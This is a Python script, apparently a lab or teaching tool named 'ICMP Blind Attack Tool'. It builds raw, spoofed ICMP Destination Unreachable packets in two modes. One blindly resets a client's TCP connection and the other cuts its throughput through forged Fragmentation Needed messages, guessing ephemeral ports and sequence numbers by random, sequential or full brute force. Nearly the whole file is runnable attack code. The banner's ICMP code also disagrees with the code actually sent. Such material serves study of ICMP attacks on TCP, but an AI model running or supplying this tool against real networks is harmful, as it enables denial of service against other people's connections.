import socket
import struct
import random
import time

## client port guessing -  commonly 49152–65535 on Linux

CLIENT_IP = "10.0.0.2"        # Target client
SERVER_IP = "10.0.0.1"        # Target server  
ATTACKER_IP = "192.168.1.1"   # Spoofed router IP for throughput attack
SERVER_PORT = 8080
NEXT_HOP_MTU = 512
MAX_SEQ = 4294967295          # Full 32-bit sequence number range
icmp_reset_code = 2

def get_port_scan_strategy():
    """Return port scanning strategy for blind attack"""
    print("[ATTACKER] As a blind attacker, I must guess the client port...")
    print("Strategies:")
    print("1. Random sampling (1000 random ports) - realistic and fast")
    print("2. Sequential scan (every 10th port) - systematic but slow")  
    print("3. Full brute force (all 32768 ports) - guaranteed but very slow")
    
    choice = input("Select scanning strategy (1-3): ")
    if choice == "1":
        return "random", "Random sampling"
    elif choice == "2": 
        return "sequential", "Sequential scan"
    elif choice == "3":
        return "full", "Full brute force"
    else:
        return "random", "Random sampling"

def checksum(data):
    """Calculate Internet checksum (RFC 1071)"""
    # Pad data to even length
    if len(data) % 2:
        data += b'\x00'
    
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + data[i+1]
        s += w
        
    # Add carry bits
    while (s >> 16):
        s = (s >> 16) + (s & 0xffff)
    
    # One's complement
    return (~s) & 0xffff

def build_ip_header(src_ip, dst_ip, payload_len):
    version_ihl = (4 << 4) + 5  # Version 4, Header Length 5 (20 bytes)
    tos = 0
    total_length = 20 + payload_len
    identification = random.randint(0, 65535)
    flags_fragment = 0
    ttl = 64
    proto = 1  # ICMP
    checksum_val = 0  # Will be calculated
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    
    # Build header with zero checksum
    ip_header = struct.pack("!BBHHHBBH4s4s",
                             version_ihl, tos, total_length, identification,
                             flags_fragment, ttl, proto, checksum_val, src, dst)
    
    # Calculate checksum over IP header only
    checksum_val = checksum(ip_header)
    
    # Rebuild header with correct checksum
    ip_header = struct.pack("!BBHHHBBH4s4s",
                             version_ihl, tos, total_length, identification,
                             flags_fragment, ttl, proto, checksum_val, src, dst)
    return ip_header

def build_icmp_header(type_, code, rest_of_header, payload):
    # Build header with zero checksum first
    icmp_checksum = 0
    header = struct.pack("!BBH4s", type_, code, icmp_checksum, rest_of_header)
    
    # Calculate checksum over header + payload
    data = header + payload
    icmp_checksum = checksum(data)
    
    # Rebuild header with correct checksum
    header = struct.pack("!BBH4s", type_, code, icmp_checksum, rest_of_header)
    return header

def build_embedded_headers(client_ip, server_ip, client_port, server_port, seq):
    # Build embedded IP header with correct checksum
    version_ihl = (4 << 4) + 5
    tos = 0
    total_length = 40  # IP(20) + TCP(20)
    identification = random.randint(0, 65535)
    flags_fragment = 0
    ttl = 64
    proto = 6  # TCP
    ip_checksum = 0  # Will be calculated
    src = socket.inet_aton(client_ip)
    dst = socket.inet_aton(server_ip)
    
    # Build IP header with zero checksum first
    embedded_ip = struct.pack("!BBHHHBBH4s4s",
                               version_ihl, tos, total_length, identification,
                               flags_fragment, ttl, proto, ip_checksum, src, dst)
    
    # Calculate checksum for embedded IP header
    ip_checksum = checksum(embedded_ip)
    
    # Rebuild IP header with correct checksum
    embedded_ip = struct.pack("!BBHHHBBH4s4s",
                               version_ihl, tos, total_length, identification,
                               flags_fragment, ttl, proto, ip_checksum, src, dst)
    
    # Build embedded TCP header (first 8 bytes are enough for ICMP error)
    tcp_header = struct.pack("!HHII", client_port, server_port, seq, 0)
    
    return embedded_ip + tcp_header[:8]

def icmp_connection_reset(sock, strategy="random"):
    """Send ICMP Destination Unreachable (Connection Reset) packets"""
    print(f"[ATTACKER] ICMP Connection Reset Attack Started...")
    
    attack_count = 0
    
    if strategy == "random":
        print("[ATTACKER] Using random port sampling...")
        # Generate 1000 random ports in ephemeral range
        ports = random.sample(range(32768, 65536), min(1000, 65536-32768))
        
        for port in ports:
            # Try multiple sequence numbers per port
            for _ in range(3):
                seq = random.randint(0, MAX_SEQ)
                
                embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
                rest_of_header = b"\x00\x00\x00\x00"
                icmp_header = build_icmp_header(3, icmp_reset_code, rest_of_header, embedded)
                ip_header = build_ip_header(SERVER_IP, CLIENT_IP, len(icmp_header) + len(embedded))
                
                packet = ip_header + icmp_header + embedded
                sock.sendto(packet, (CLIENT_IP, 0))
                attack_count += 1
                
            if attack_count % 300 == 0:  # Progress every 100 ports
                print(f"[+] Tested {attack_count//3} ports...")
                
            time.sleep(0.001)
            
    elif strategy == "sequential":
        print("[ATTACKER] Using sequential scanning with multiple passes...")
        # Multiple passes with different offsets to ensure coverage
        for offset in range(10):  # 10 different starting points
            for port in range(32768 + offset, 65536, 10):
                for _ in range(2):  # 2 sequence attempts per port
                    seq = random.randint(0, MAX_SEQ)
                    
                    embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
                    rest_of_header = b"\x00\x00\x00\x00"
                    icmp_header = build_icmp_header(3, icmp_reset_code, rest_of_header, embedded)
                    ip_header = build_ip_header(SERVER_IP, CLIENT_IP, len(icmp_header) + len(embedded))
                    
                    packet = ip_header + icmp_header + embedded
                    sock.sendto(packet, (CLIENT_IP, 0))
                    attack_count += 1
                    
                time.sleep(0.0005)
                
            print(f"[+] Completed pass {offset + 1}/10...")
            
    elif strategy == "full":
        print("[ATTACKER] Using full brute force scan...")
        for port in range(32768, 65536):
            # Try 2 sequence numbers per port
            for _ in range(2):
                seq = random.randint(0, MAX_SEQ)
                
                embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
                rest_of_header = b"\x00\x00\x00\x00"
                icmp_header = build_icmp_header(3, icmp_reset_code, rest_of_header, embedded)
                ip_header = build_ip_header(SERVER_IP, CLIENT_IP, len(icmp_header) + len(embedded))
                
                packet = ip_header + icmp_header + embedded
                sock.sendto(packet, (CLIENT_IP, 0))
                attack_count += 1
                
            if port % 1000 == 768:
                print(f"[+] Scanned up to port {port}...")
                
            time.sleep(0.0002)  # Very small delay for full scan
    
    print(f"[ATTACKER] Sent {attack_count} ICMP Reset packets")
    print(f"[ATTACKER] Attack complete - if connection was active, it should be reset")

def icmp_throughput_reduction(sock, strategy="random"):
    """Send ICMP Fragmentation Needed packets to reduce throughput"""
    print(f"[ATTACKER] ICMP Throughput Reduction Attack Started...")
    
    attack_count = 0
    
    if strategy == "random":
        print("[ATTACKER] Using random port sampling...")
        ports = random.sample(range(32768, 65536), min(1000, 65536-32768))
        
        for port in ports:
            for _ in range(2):  # 2 sequence attempts per port
                seq = random.randint(0, MAX_SEQ)
                
                embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
                mtu_bytes = struct.pack("!HH", 0, NEXT_HOP_MTU)
                icmp_header = build_icmp_header(3, 4, mtu_bytes, embedded)
                ip_header = build_ip_header(ATTACKER_IP, CLIENT_IP, len(icmp_header) + len(embedded))
                
                packet = ip_header + icmp_header + embedded
                sock.sendto(packet, (CLIENT_IP, 0))
                attack_count += 1
                
            if attack_count % 200 == 0:
                print(f"[+] Tested {attack_count//2} ports... (MTU={NEXT_HOP_MTU})")
                
            time.sleep(0.001)
            
    elif strategy == "sequential":
        print("[ATTACKER] Using sequential scanning with multiple passes...")
        for offset in range(10):
            for port in range(32768 + offset, 65536, 10):
                for _ in range(2):
                    seq = random.randint(0, MAX_SEQ)
                    
                    embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
                    mtu_bytes = struct.pack("!HH", 0, NEXT_HOP_MTU)
                    icmp_header = build_icmp_header(3, 4, mtu_bytes, embedded)
                    ip_header = build_ip_header(ATTACKER_IP, CLIENT_IP, len(icmp_header) + len(embedded))
                    
                    packet = ip_header + icmp_header + embedded
                    sock.sendto(packet, (CLIENT_IP, 0))
                    attack_count += 1
                    
                time.sleep(0.0005)
                
            print(f"[+] Completed pass {offset + 1}/10... (MTU={NEXT_HOP_MTU})")
            
    elif strategy == "full":
        print("[ATTACKER] Using full brute force scan...")
        for port in range(32768, 65536):
            for _ in range(2):
                seq = random.randint(0, MAX_SEQ)
                
                embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
                mtu_bytes = struct.pack("!HH", 0, NEXT_HOP_MTU)
                icmp_header = build_icmp_header(3, 4, mtu_bytes, embedded)
                ip_header = build_ip_header(ATTACKER_IP, CLIENT_IP, len(icmp_header) + len(embedded))
                
                packet = ip_header + icmp_header + embedded
                sock.sendto(packet, (CLIENT_IP, 0))
                attack_count += 1
                
            if port % 1000 == 768:
                print(f"[+] Scanned up to port {port}... (MTU={NEXT_HOP_MTU})")
                
            time.sleep(0.0002)
    
    print(f"[ATTACKER] Sent {attack_count} ICMP Fragmentation Needed packets")
    print(f"[ATTACKER] Attack complete - if connection was active, throughput should be reduced")

if __name__ == "__main__":
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("[!] Run as root: sudo python3 attacker.py")
        exit(1)

    print("=== ICMP Blind Attack Tool ===")
    print("This simulates a realistic blind attacker who must guess connection details")
    print()
    print("Attack Types:")
    print("1. Connection Reset Attack (ICMP Type 3, Code 1)")
    print("2. Throughput Reduction Attack (ICMP Type 3, Code 4)") 
    print("3. Both Attacks")
    
    choice = input("Select attack type (1-3): ")
    
    # Get scanning strategy for blind attack
    strategy, strategy_name = get_port_scan_strategy()
    print(f"[ATTACKER] Using {strategy_name}")
    print()
    
    if choice == "1":
        icmp_connection_reset(sock, strategy)
    elif choice == "2":
        icmp_throughput_reduction(sock, strategy)
    elif choice == "3":
        print("[ATTACKER] Running combined attack...")
        icmp_throughput_reduction(sock, strategy)
        time.sleep(2)
        icmp_connection_reset(sock, strategy)
    else:
        print("Invalid choice")
    
    sock.close()
